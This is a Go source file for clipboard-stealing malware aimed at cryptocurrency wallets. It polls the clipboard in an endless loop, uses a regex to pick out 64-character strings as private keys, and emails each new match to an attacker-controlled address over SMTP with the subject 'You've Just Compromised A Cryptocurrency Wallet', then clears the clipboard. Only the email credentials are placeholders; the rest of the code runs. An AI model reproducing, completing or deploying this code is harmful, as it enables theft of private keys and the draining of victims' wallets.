package main

import (
	"log"
	"net/smtp"
	"regexp"
	"time"

	"github.com/atotto/clipboard"
)

//@latestTrigger contains the latest regex matched private key.
var latestTrigger string

func main() {
	//Below controls ensure that the attack happens endlessly:
	for true {
		privateKeyAttack()
	}
}

//This function contains an attack combining the previously mentioned concepts.
func privateKeyAttack() {
	//@observer monitors the content of the clipboard.
	observer, err := clipboard.ReadAll()
	if err != nil {
		log.Fatalf("[!] clipboard.ReadAll() returned with code %s", err)
	}

	//@re contains the private key regex pattern.
	re := regexp.MustCompile(`^[a-zA-Z0-9]{64}$`)

	//@trigger seeks to find a regex matching private key.
	trigger := string(re.Find([]byte(observer)))

	//Below controls ensure !empty clipboard and distinct private key notifications:
	if trigger != "" && latestTrigger != trigger {
		//notifyMe() sends an email containing the compromised private key.
		notifyMe(trigger)
		//@latestTrigger updates the latest triggered regex matching private key.
		latestTrigger = trigger
		//time.Sleep() is a behavioral addition which ensures that the clipboard is not modified by the payload for at least x time.
		time.Sleep(360 * time.Second)
		//clipboard.WriteAll() empties the clipboard and prepares the loop to be continued.
		clipboard.WriteAll("")
	}
}

//This function notifies the attacker through email communication.
func notifyMe(privateKey string) {
	//Gmail setup and authentication requirements:
	//@email_addr contains the email account address.
	//@email_pass contains the email account password.
	//@email_prov contains the email account provider.

	email_addr := "INSERT EMAIL ADDRESS HERE"
	email_pass := "INSERT EMAIL PASSWORD HERE"
	email_prov := "INSERT EMAIL PROVIDER HERE"
	auth := smtp.PlainAuth("", email_addr, email_pass, email_prov)

	//Email communication setup requirements:
	//@to contains the email recipient.
	//@msg contains the body of the email.

	to := []string{email_addr}
	msg := []byte("To:" + email_addr + "\r\n" +
		"Subject: You've Just Compromised A Cryptocurrency Wallet\r\n" +
		"\r\n" +
		"Please Check The Following Private Key For Assets: " + " " + privateKey)

	err := smtp.SendMail(email_prov+":587", auth, email_addr, to, msg)
	if err != nil {
		log.Fatal(err)
	}
}
